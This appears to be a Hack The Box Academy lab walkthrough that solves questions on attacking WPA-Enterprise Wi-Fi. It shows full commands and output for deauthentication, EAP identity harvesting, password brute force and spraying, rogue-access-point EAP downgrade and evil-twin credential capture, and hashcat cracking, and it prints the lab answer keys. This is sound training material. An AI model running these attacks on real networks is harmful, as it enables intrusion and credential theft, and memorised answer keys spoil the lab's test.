```

```
root@WiFiIntro:/home/wifi# sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    185 avahi-daemon
    201 wpa_supplicant
    209 avahi-daemon
    219 NetworkManager

PHY	Interface	Driver		Chipset

phy1	wlan0		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)
```

Having enabled the monitor mode on the `wlan0` (`wlan0mon`) interface, students will proceed to use `airodump-ng` on channel 1 and save the traffic to a file:

Code: shell

```shell
airodump-ng wlan0mon -c 1 -w AcademyStudent
```

```
root@HTB-Corp:/home/wifi# airodump-ng wlan0mon -c 1 -w AcademyStudent

CH  1 ][ Elapsed: 24 s ][ 2025-01-08 07:39 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 5C:64:F1:C0:10:A1  -28 100      270       12    2   1   54   WPA2 CCMP   MGT  HTB-Corp                       

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 5C:64:F1:C0:10:A1  0A:B6:66:D3:6A:DC  -29    6 -54      0        9
```

Students will open another terminal/tab, switch to the root user, and perform a deauthentication attack using `aireplay-ng` and the found BSSIDs of both the access point (`HackMe`) and the client. Note the client's BSSID (MAC address) is subject to change upon spawn/reset of the target.

Code: shell

```shell
sudo -s
aireplay-ng -0 1 -a 5C:64:F1:C0:10:A1 -c 0A:B6:66:D3:6A:DC wlan0mon
```

```
wifi@HTB-Corp:~$ sudo -s
root@HTB-Corp:/home/wifi# aireplay-ng -0 1 -a 5C:64:F1:C0:10:A1 -c 0A:B6:66:D3:6A:DC wlan0mon

07:41:22  Waiting for beacon frame (BSSID: 5C:64:F1:C0:10:A1) on channel 1
07:41:22  Sending 64 directed DeAuth (code 7). STMAC: [0A:B6:66:D3:6A:DC] [ 0| 0 ACKs]
```

Next, they will use `tshark` to extract username information by filtering out based on the BSSID (MAC address) of the access point and using EAP-related filters:

Code: shell

```shell
tshark -r AcademyStudent-01.cap -Y '(eap && wlan.ra == 5C:64:F1:C0:10:A1) && (eap.identity)' -T fields -e eap.identity
```

```
root@HTB-Corp:/home/wifi# tshark -r AcademyStudent-01.cap -Y '(eap && wlan.ra == 5C:64:F1:C0:10:A1) && (eap.identity)' -T fields -e eap.identity

Running as user "root" and group "root". This could be dangerous.
{hidden}
```

Answer: `HTB\Sentinal`

# WPA Enterprise Reconnaissance

## Question 2

### "Is the authentication method EAP-TTLS\_EAP-MD5-Challenge supported in RADIUS server for user HTB\\Administrator? (Format: Yes/No)"

Students will reuse the previously established RDP session and terminate the `airodump-ng` process using the key combination `Ctrl + C`. Subsequently, they will use `EAP_buster.sh` on `wlan0mon` interface, located in the `/opt/EAP_buster` directory to find supported authentication methods including the `EAP-TTLS_EAP-MD5-Challenge` method by the `HTB-Corp` access point for the `HTB\Administrator` user:

Code: shell

```shell
/opt/EAP_buster/EAP_buster.sh HTB-Corp 'HTB\Administrator' wlan0mon
```

```
oot@HTB-Corp:/home/wifi# /opt/EAP_buster/EAP_buster.sh HTB-Corp 'HTB\Administrator' wlan0mon

EAP_buster by BlackArrow [https://github.com/blackarrowsec/EAP_buster]

<SNIP>

{hidden}      =>  EAP-PEAP_MD5-Challenge

<SNIP>
```

Answer: `Yes`

# Performing Bruteforce Attacks

## Question 1

### "Perform the brute-force attack as demonstrated in this section. What is the password for the user HTB\\Sentinal?"

After spawning the target, students will proceed to establish an RDP connection using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.121]─[htb-ac-8414@htb-jarizq3npu]─[~]
└──╼ [★]$ xfreerdp /v:10.129.5.83 /u:wifi /p:wifi /dynamic-resolution 

[02:37:11:970] [30449:30450] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[02:37:12:271] [30449:30450] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[02:37:12:271] [30449:30450] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[02:37:12:283] [30449:30450] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[02:37:12:283] [30449:30450] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[02:37:12:283] [30449:30450] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Students will open a terminal and switch to the root's user context:

Code: shell

```shell
sudo -s
```

```
wifi@WiFiIntro:~$ sudo -s
```

They will use `iwlist` to scan the network for available access points using the `wlan0` interface to find the `HTB-Corp` access point:

Code: shell

```shell
iwlist wlan0 scanning | grep 'Cell\|Quality\|ESSID\|IEEE'
```

```
root@HTB-Corp:/home/wifi# iwlist wlan0 scanning | grep 'Cell\|Quality\|ESSID\|IEEE'

          Cell 01 - Address: 5C:64:F1:C0:10:A1
                    Quality=70/70  Signal level=-30 dBm  
                    ESSID:"HTB-Corp"
                    IE: IEEE 802.11i/WPA2 Version 1
```

Next, students will change their current working directory to `/opt/air-hammer` and perform a brute-force attack against the `HTB\Sentinal` user using the `rockyou.txt` wordlist located in the `/opt` directory to attain the password for the user:

Code: shell

```shell
cd /opt/air-hammer
echo "HTB\Sentinal" > user.txt
python2 air-hammer.py -i wlan0 -e HTB-Corp -p /opt/rockyou.txt -u user.txt
```

```
root@HTB-Corp:/home/wifi# cd /opt/air-hammer
root@HTB-Corp:/opt/air-hammer# echo "HTB\Sentinal" > user.txt
root@HTB-Corp:/opt/air-hammer# python2 air-hammer.py -i wlan0 -e HTB-Corp -p /opt/rockyou.txt -u user.txt

[0]  Trying HTB\Sentinal:123456...
[0]  Trying HTB\Sentinal:12345...

<SNIP>

[0]  Trying HTB\Sentinal:sunshine...
[!] VALID CREDENTIALS: HTB\Sentinal:{hidden}

<SNIP>
```

Answer: `sunshine`

# Performing Bruteforce Attacks

## Question 2

### "Perform the password spray attack as demonstrated in this section. What is the name of another user with the same password as HTB\\Sentinal? (Format: Domain\\Username)"

Students will reuse the previously established RDP session and terminate the `air-hammer.py` process. Subsequently, they will create a user list using the `john.txt` list located in the `/opt/statistically-likely-usernames` directory and will append the `HTB\` domain prefix:

Code: shell

```shell
cat /opt/statistically-likely-usernames/john.txt | awk '{print "HTB\\" $1}' > users.txt
```

```
root@HTB-Corp:/opt/air-hammer# cat /opt/statistically-likely-usernames/john.txt | awk '{print "HTB\\" $1}' > users.txt
```

Next, students will use `air-hammer.py` to perform a reverse brute force using the previously found password of the user `HTB\Sentinal` to uncover a user using the same password:

Code: shell

```shell
python2 air-hammer.py -i wlan0 -e HTB-Corp -P {hidden} -u users.txt
```

```
root@HTB-Corp:/opt/air-hammer# python2 air-hammer.py -i wlan0 -e HTB-Corp -P {hidden} -u users.txt

<SNIP>

[7]  Trying HTB\{hidden}:{hidden}...
[!] VALID CREDENTIALS: HTB\{hidden}:{hidden}

<SNIP>
```

Answer: `HTB\jason`

# EAP Downgrade Attack (Attacking)

## Question 1

### "Perform the EAP downgrade attack as demonstrated in this section. What is the password for user HTB\\Sentinal?"

After spawning the target, students will proceed to establish an RDP connection using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.121]─[htb-ac-8414@htb-8rkgr5npc7]─[~]
└──╼ [★]$ xfreerdp /v:10.129.19.233 /u:wifi /p:wifi /dynamic-resolution 

[05:08:27:854] [8485:8486] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[05:08:29:957] [8485:8486] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[05:08:29:957] [8485:8486] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[05:08:29:970] [8485:8486] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[05:08:29:970] [8485:8486] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[05:08:29:970] [8485:8486] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Students will open a terminal and switch to the root's user context:

Code: shell

```shell
sudo -s
```

```
wifi@WiFiIntro:~$ sudo -s
```

Students will reuse the `hostapd.conf` file from the section and will save it as `hostapd.conf`:

Code: conf

```conf
# Interface configuration
interface=wlan1
ssid=HTB-Corp
channel=1
auth_algs=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
wpa=3
hw_mode=g
ieee8021x=1

# EAP Configuration
eap_server=1
eap_user_file=hostapd.eap_user

# Mana Configuration
enable_mana=1
mana_loud=1
mana_credout=credentials.creds
mana_eapsuccess=1
mana_wpe=1

# Certificate Configuration
ca_cert=ca.pem
server_cert=server.pem
private_key=server-key.pem
dh_file=dh.pem
```

Next, students will use the configuration file for the authentication methods from the section and save it as `hostapd.eap_user`:

Code: configuration

```configuration
* TTLS,PEAP,TLS,MD5,GTC
"t" TTLS-PAP,GTC,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2,MD5 "challenge1234" [2]
```

Students will generate Diffie-Hellman parameters using `openssl` using the `dhparam` option and will save it to a file called `dh.pem`:

Code: shell

```shell
openssl dhparam -out dh.pem 2048
```

```
root@HTB-Corp:/home/wifi# openssl dhparam -out dh.pem 2048

Generating DH parameters, 2048 bit long safe prime

<SNIP>
```

They will generate a CA key using `openssl` and the `genrsa` option and save it to `ca-key.pem`:

Code: shell

```shell
openssl genrsa -out ca-key.pem 2048
```

```
root@HTB-Corp:/home/wifi# openssl genrsa -out ca-key.pem 2048
```

Students will generate an x509 certificate using `openssql` and the `req` option while following the template from the section for the fields:

Code: shell

```shell
openssl req -new -x509 -nodes -days 100 -key ca-key.pem -out ca.pem
US
California
San Francisco
Hack The Box
HTB
HTB
student@htb.com
```

```
root@HTB-Corp:/home/wifi# openssl req -new -x509 -nodes -days 100 -key ca-key.pem -out ca.pem

You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:California
Locality Name (eg, city) []:San Francisco
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Hack The Box
Organizational Unit Name (eg, section) []:HTB
Common Name (e.g. server FQDN or YOUR name) []:HTB
Email Address []:student@htb.com
```

Students will generate a server certificate and a private key with `openssl`, while specifying the same information for the fields and additionally specifying the `challenge1234` for the challenge password as configured in the `hostapd.conf` file earlier:

Code: shell

```shell
openssl req -newkey rsa:2048 -nodes -days 100 -keyout server-key.pem -out server-key.pem
US
California
San Francisco
Hack The Box
HTB
HTB
student@htb.com
challenge1234
```

```
root@HTB-Corp:/home/wifi# openssl req -newkey rsa:2048 -nodes -days 100 -keyout server-key.pem -out server-key.pem

Ignoring -days without -x509; not generating a certificate

<SNIP>

-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:California
Locality Name (eg, city) []:San Francisco
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Hack The Box
Organizational Unit Name (eg, section) []:HTB
Common Name (e.g. server FQDN or YOUR name) []:HTB
Email Address []:student@htb.com

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:challenge1234
An optional company name []:
```

Students will generate the x509 certificate server using the previously generated certificates using `openssl`:

Code: shell

```shell
openssl x509 -req -days 100 -set_serial 01 -in server-key.pem -out server.pem -CA ca.pem -CAkey ca-key.pem
```

```
root@HTB-Corp:/home/wifi# openssl x509 -req -days 100 -set_serial 01 -in server-key.pem -out server.pem -CA ca.pem -CAkey ca-key.pem

Certificate request self-signature ok
subject=C=US, ST=California, L=San Francisco, O=Hack The Box, OU=HTB, CN=HTB, emailAddress=student@htb.com
```

Next, students will start the fake access point using `hostapd-mana` and specify the `hostapd.conf` file:

Code: shell

```shell
hostapd-mana hostapd.conf
```

```
root@HTB-Corp:/home/wifi# hostapd-mana hostapd.conf

Configuration file: hostapd.conf
MANA: Captured credentials will be written to file 'credentials.creds'.
rfkill: Cannot open RFKILL control device
Using interface wlan1 with hwaddr b2:e1:92:3d:e3:04 and ssid "HTB-Corp"
random: Only 16/20 bytes of strong random data available from /dev/random
random: Not enough entropy pool available for secure operations
WPA: Not enough entropy in random pool for secure operations - update keys later when the first station connects
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED 
```

Students will open a new terminal, switch to the `root` user, and enable monitor mode on the `wlan0` interface using `airmon-ng`:

Code: shell

```shell
sudo -s
sudo airmon-ng start wlan0
```

```
wifi@HTB-Corp:~$ sudo -s
root@HTB-Corp:/home/wifi# sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    180 avahi-daemon
    196 avahi-daemon
    208 NetworkManager
    277 wpa_supplicant

PHY	Interface	Driver		Chipset

phy2	wlan0		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 monitor mode vif enabled for [phy2]wlan0 on [phy2]wlan0mon)
		(mac80211 station mode vif disabled for [phy2]wlan0)
phy3	wlan1		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211
```

Subsequently, students will initiate `airodump-ng` on channel one and will take note of the BSSID of the legitimate access point (`HTB-Corp`) and the BSSID of the client connected to it. Note the client's BSSID (MAC address) is subject to change upon spawn/reset of the target.:

Code: shell

```shell
sudo airodump-ng wlan0mon -c 1
```

```
root@HTB-Corp:/home/wifi# sudo airodump-ng wlan0mon -c 1

 CH  1 ][ Elapsed: 36 s ][ 2025-01-08 11:27 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 3C:B4:03:39:BB:6C  -28 100      348       12    0   1   54   WPA2 CCMP   MGT  HTB-Corp                           
 B2:E1:92:3D:E3:04  -28 100      348        0    0   1   54   WPA2 CCMP   MGT  HTB-Corp                           

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 3C:B4:03:39:BB:6C  52:7C:9C:12:90:BD  -29    2 -24      0       10  
```

They will open a new terminal, switch to the `root` user, and perform de-authentication of the client connected to the legitimate `HTP-Corp` network using `aireplay-ng` by specifying the MAC address (STATION) of the client and `HTB-Corp`'s network found earlier:

Code: shell

```shell
sudo -s
sudo aireplay-ng -0 6 -c 52:7C:9C:12:90:BD -a 3C:B4:03:39:BB:6C wlan0mon
```

```
wifi@HTB-Corp:~$ sudo -s
root@HTB-Corp:/home/wifi# sudo aireplay-ng -0 6 -c 52:7C:9C:12:90:BD -a 3C:B4:03:39:BB:6C wlan0mon

11:30:51  Waiting for beacon frame (BSSID: 3C:B4:03:39:BB:6C) on channel 1
11:30:52  Sending 64 directed DeAuth (code 7). STMAC: [52:7C:9C:12:90:BD] [ 0| 0 ACKs]
11:30:52  Sending 64 directed DeAuth (code 7). STMAC: [52:7C:9C:12:90:BD] [ 0| 0 ACKs]
11:30:53  Sending 64 directed DeAuth (code 7). STMAC: [52:7C:9C:12:90:BD] [ 0| 0 ACKs]
11:30:53  Sending 64 directed DeAuth (code 7). STMAC: [52:7C:9C:12:90:BD] [ 0| 0 ACKs]
11:30:54  Sending 64 directed DeAuth (code 7). STMAC: [52:7C:9C:12:90:BD] [ 0| 0 ACKs]
11:30:54  Sending 64 directed DeAuth (code 7). STMAC: [52:7C:9C:12:90:BD] [ 0| 0 ACKs]
```

After performing the de-authentication, students will notice the cleartext credentials of `HTB\Sentinal` in the `hostapd-mana` process. Note, sometimes an additional de-authentication may be needed:

```
root@HTB-Corp:/home/wifi# hostapd-mana hostapd.conf

Configuration file: hostapd.conf
MANA: Captured credentials will be written to file 'credentials.creds'.
rfkill: Cannot open RFKILL control device
Using interface wlan1 with hwaddr b2:e1:92:3d:e3:04 and ssid "HTB-Corp"

<SNIP>

MANA EAP Identity Phase 0: HTB\Sentinal
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=21
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
MANA EAP Identity Phase 1: HTB\Sentinal
MANA EAP GTC | HTB\\Sentinal:{hidden}
wlan1: CTRL-EVENT-EAP-SUCCESS 52:7c:9c:12:90:bd

<SNIP>
```

Answer: `V3ryV3ryStR0nGP2300W0rd`

# EAP Downgrade Attack (Attacking)

## Question 2

### "Connect to the HTB-Corp WiFi network using the obtained credentials. What is the value of the flag at 192.168.1.1?"

Students will reuse the previously established RDP session and will terminate the previously started processes using the key combination `Ctrl + C`. They will disable monitor mode on the `wlan0mon` (`wlan0`) interface using `airmon-ng`:

Code: shell

```shell
sudo airmon-ng stop wlan0mon
```

```
root@HTB-Corp:/home/wifi# sudo airmon-ng stop wlan0mon

PHY	Interface	Driver		Chipset

phy2	wlan0mon	htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 station mode vif enabled on [phy2]wlan0)

		(mac80211 monitor mode vif disabled for [phy2]wlan0mon)
phy3	wlan1		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211
```

Next, students will create a wpa\_supplicant configuration file using the credentials found earlier to connect to the `HTB-Corp` network:

Code: shell

```shell
cat << EOF > wpa.conf
network={
  ssid="HTB-Corp"
  key_mgmt=WPA-EAP
  identity="HTB\Sentinal"
  password="{hidden}"
}
EOF
```

```
root@HTB-Corp:/home/wifi# cat << EOF > wpa.conf
network={
  ssid="HTB-Corp"
  key_mgmt=WPA-EAP
  identity="HTB\Sentinal"
  password="{hidden}"
}
EOF
```

Students will use the configuration file (`wpa.conf` ) to connect to the `HTB-Corp` network using `wpa_supplicant` and the `wlan0` interface:

Code: shell

```shell
sudo wpa_supplicant -c wpa.conf -i wlan0
```

```
root@HTB-Corp:/home/wifi# sudo wpa_supplicant -c wpa.conf -i wlan0

Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information
nl80211: Could not set interface 'p2p-dev-wlan0' UP

<SNIP>

hash=1baa7e3e349ed32eb604695a15aca6e84a53e2eb3833426f10c8698e91215e91
EAP-MSCHAPV2: Authentication succeeded
wlan0: CTRL-EVENT-EAP-SUCCESS EAP authentication completed successfully
wlan0: PMKSA-CACHE-ADDED 3c:b4:03:39:bb:6c 0
wlan0: WPA: Key negotiation completed with 3c:b4:03:39:bb:6c [PTK=CCMP GTK=CCMP]
wlan0: CTRL-EVENT-CONNECTED - Connection to 3c:b4:03:39:bb:6c completed [id=0 id_str=]
```

In a different terminal, students will use `dhclient` to obtain an IP address from `HTB-Corp` on the `wlan0` interface:

Code: shell

```shell
sudo dhclient wlan0
```

```
root@HTB-Corp:/home/wifi# sudo dhclient wlan0
```

Students will use `wget` to obtain the flag located at the `http://192.168.1.1` address:

Code: shell

```shell
wget http://192.168.1.1
cat index.html
```

```
root@HTB-Corp:/home/wifi# wget http://192.168.1.1

--2025-01-08 11:42:56--  http://192.168.1.1/
Connecting to 192.168.1.1:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 28 [text/html]
Saving to: ‘index.html’

index.html                   100%[=============================================>]      28  --.-KB/s    in 0s      

2025-01-08 11:42:56 (4.86 MB/s) - ‘index.html’ saved [28/28]

root@HTB-Corp:/home/wifi# cat index.html

{hidden}
```

Answer: `HTB{F0rce_DownGR2d3_AttacK}`

# Enterprise Evil-Twin Attack

## Question 1

### "Perform the attack as demonstrated in this section. What is the Username found? (Format: Domain\\Username)"

After spawning the target, students will proceed to establish an RDP connection using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.121]─[htb-ac-8414@htb-8rkgr5npc7]─[~]
└──╼ [★]$ xfreerdp /v:10.129.117.38 /u:wifi /p:wifi /dynamic-resolution 

[06:17:50:216] [113174:113175] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[06:17:51:517] [113174:113175] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[06:17:51:517] [113174:113175] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[06:17:51:531] [113174:113175] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[06:17:51:531] [113174:113175] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[06:17:51:532] [113174:113175] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Students will open a terminal and switch to the root's user context:

Code: shell

```shell
sudo -s
```

```
wifi@WiFiIntro:~$ sudo -s
```

They will enable monitor mode on the `wlan0` interface using `airmon-ng` and will start `airodump-ng` on channel one while taking note of the client's MAC address connected to the access point `HTB-Corp` and the access point's MAC address (BSSID). Note the BSSID (MAC address) is subject to change upon spawn/reset of the target.:

Code: shell

```shell
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon -c 1
```

```
root@HTB-Corp:/home/wifi# sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.

<SNIP>

phy3	wlan1		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211
phy4	wlan2		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

root@HTB-Corp:/home/wifi# sudo airodump-ng wlan0mon -c 1

 CH  1 ][ Elapsed: 36 s ][ 2025-01-08 12:21 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 54:8C:A0:E8:DF:B1  -28 100      364       12    0   1   54   WPA2 CCMP   MGT  HTB-Corp                                    

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 54:8C:A0:E8:DF:B1  AA:30:C2:FB:98:8B  -29   54 - 9      0       10
```

Next, students will copy the `hostapd-wpe.conf` to their current working directory from `/etc/hostapd-wpe`:

Code: shell

```shell
cp /etc/hostapd-wpe/hostapd-wpe.conf hostapd-wpe.conf
```

```
root@HTB-Corp:/home/wifi# cp /etc/hostapd-wpe/hostapd-wpe.conf hostapd-wpe.conf
```

They will adjust the `interface` value from `wlan0` to `wlan1` and the `ssid` from `hostapd-wpe` to `HTB-Corp` using `sed` in the `hostapd-wpe.conf` file:

Code: shell

```shell
sed -i "s/wlan0/wlan1/g" hostapd-wpe.conf 
sed -i "s/ssid=hostapd-wpe/ssid=HTB-Corp/g" hostapd-wpe.conf
```

```
root@HTB-Corp:/home/wifi# sed -i "s/wlan0/wlan1/g" hostapd-wpe.conf
root@HTB-Corp:/home/wifi# sed -i "s/ssid=hostapd-wpe/ssid=HTB-Corp/g" hostapd-wpe.conf
```

Subsequently, students will use `hostapd-wpe` to create a rogue network, enabling Cupid mode (`-c`) and Karma mode (`-k`) while specifying the `hostapd-wpe.conf` configuration file:

Code: shell

```shell
sudo hostapd-wpe -c -k hostapd-wpe.conf
```

```
root@HTB-Corp:/home/wifi# sudo hostapd-wpe -c -k hostapd-wpe.conf

rfkill: Cannot open RFKILL control device
random: Only 16/20 bytes of strong random data available
random: Not enough entropy pool available for secure operations
WPA: Not enough entropy in random pool for secure operations - update keys later when the first station connects
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED 
```

Students will open a new terminal, switch to the `root` user, and will perform de-authentication using `aireplay-ng` against the previously gathered MAC address of the client connected to the `HTB-Corp` network and the MAC address of the network itself:

Code: shell

```shell
sudo -s
sudo aireplay-ng -0 10 -c AA:30:C2:FB:98:8B -a 54:8C:A0:E8:DF:B1 wlan0mon
```

```
wifi@HTB-Corp:~$ sudo -s
root@HTB-Corp:/home/wifi# sudo aireplay-ng -0 10 -c AA:30:C2:FB:98:8B -a 54:8C:A0:E8:DF:B1 wlan0mon

12:30:14  Waiting for beacon frame (BSSID: 54:8C:A0:E8:DF:B1) on channel 1
12:30:14  Sending 64 directed DeAuth (code 7). STMAC: [AA:30:C2:FB:98:8B] [ 0| 0 ACKs]
12:30:15  Sending 64 directed DeAuth (code 7). STMAC: [AA:30:C2:FB:98:8B] [ 0| 0 ACKs]
12:30:15  Sending 64 directed DeAuth (code 7). STMAC: [AA:30:C2:FB:98:8B] [ 0| 0 ACKs]
12:30:16  Sending 64 directed DeAuth (code 7). STMAC: [AA:30:C2:FB:98:8B] [ 0| 0 ACKs]
12:30:16  Sending 64 directed DeAuth (code 7). STMAC: [AA:30:C2:FB:98:8B] [ 0| 0 ACKs]
12:30:17  Sending 64 directed DeAuth (code 7). STMAC: [AA:30:C2:FB:98:8B] [ 0| 0 ACKs]
12:30:17  Sending 64 directed DeAuth (code 7). STMAC: [AA:30:C2:FB:98:8B] [ 0| 0 ACKs]
12:30:18  Sending 64 directed DeAuth (code 7). STMAC: [AA:30:C2:FB:98:8B] [ 0| 0 ACKs]
12:30:19  Sending 64 directed DeAuth (code 7). STMAC: [AA:30:C2:FB:98:8B] [ 0| 0 ACKs]
12:30:19  Sending 64 directed DeAuth (code 7). STMAC: [AA:30:C2:FB:98:8B] [ 0| 0 ACKs]
```

Students will notice the authentication attempts in the previous window and the username, alongside the password of the user attempting to connect:

```
root@HTB-Corp:/home/wifi# sudo hostapd-wpe -c -k hostapd-wpe.conf

rfkill: Cannot open RFKILL control device
random: Only 16/20 bytes of strong random data available
random: Not enough entropy pool available for secure operations
WPA: Not enough entropy in random pool for secure operations - update keys later when the first station connects
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED 

<SNIP>

mschapv2: Wed Jan  8 12:30:58 2025
	 username:	{hidden}
	 challenge:	56:35:e5:b0:c5:29:98:60
	 response:	f2:ba:2d:7a:26:86:3b:20:2e:f7:fa:88:03:ea:5e:21:6d:59:b6:35:53:77:69:2e
	 jtr NETNTLM:		{hidden}:$NETNTLM$5635e5b0c5299860$f2ba2d7a2<SNIP>216d59b6355377692e
	 hashcat NETNTLM:	
	 {hidden}::::f2ba2d7a26863b202ef7fa8803<SNIP>77692e:5635e5b0c5299860

<SNIP>
```

Answer: `HTB\Sentinal.Jr`

# Enterprise Evil-Twin Attack

## Question 2

### "Crack the obtained hash using hashcat. What is the password found for the captured hash?"

Students will reuse the previously established RDP session and the output in the `hostapd-wep` process to attain the hashes password of the user previously found. Note that an additional de-authentication may be needed.

```
root@HTB-Corp:/home/wifi# sudo hostapd-wpe -c -k hostapd-wpe.conf

rfkill: Cannot open RFKILL control device
random: Only 16/20 bytes of strong random data available
random: Not enough entropy pool available for secure operations
WPA: Not enough entropy in random pool for secure operations - update keys later when the first station connects
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED 

<SNIP>

mschapv2: Wed Jan  8 12:30:58 2025
	 username:	{hidden}
	 challenge:	56:35:e5:b0:c5:29:98:60
	 response:	f2:ba:2d:7a:26:86:3b:20:2e:f7:fa:88:03:ea:5e:21:6d:59:b6:35:53:77:69:2e
	 jtr NETNTLM:		{hidden}:$NETNTLM$5635e5b0c5299860$f2ba2d7a2<SNIP>216d59b6355377692e
	 hashcat NETNTLM:	
	 {hidden}::::f2ba2d7a26863b202ef7fa8803<SNIP>77692e:5635e5b0c5299860

<SNIP>
```

Students will copy the output in the `hashcat NETNTLM` value and will return to their workstations to crack the hash using `hashcat`, the `rockyou.txt` wordlist located in `/usr/share/wordlists` and specifying the `5500` mode to recover the plaintext password:

Code: shell

```shell
hashcat -m 5500 -a 0 HTB\\Sentinal.Jr::::f2ba2d7a26863b202ef7fa8803<SNIP>77692e:5635e5b0c5299860 /usr/share/wordlists/rockyou.txt.gz
```

```
┌─[eu-academy-6]─[10.10.14.121]─[htb-ac-8414@htb-8rkgr5npc7]─[~]
└──╼ [★]$ hashcat -m 5500 -a 0 HTB\\Sentinal.Jr::::f2ba2d7a26863b202ef7fa8803<SNIP>77692e:5635e5b0c5299860 /usr/share/wordlists/rockyou.txt.gz

hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]

<SNIP>

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344385
* Bytes.....: 53357329
* Keyspace..: 14344385

HTB\Sentinal.Jr::::f2ba2d7a26863b202ef7fa8803<SNIP>77692e:5635e5b0c5299860:{hidden}
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5500 (NetNTLMv1 / NetNTLMv1+ESS)
Hash.Target......: HTB\Sentinal.Jr::::f2ba2d7a26863b202ef7fa8803ea5e216...299860
Time.Started.....: Wed Jan  8 06:36:08 2025 (0 secs)
Time.Estimated...: Wed Jan  8 06:36:08 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  1784.7 kH/s (0.12ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2048/14344385 (0.01%)
Rejected.........: 0/2048 (0.00%)
```

Answer: `september`

# Enterprise Evil-Twin Attack

## Question 3

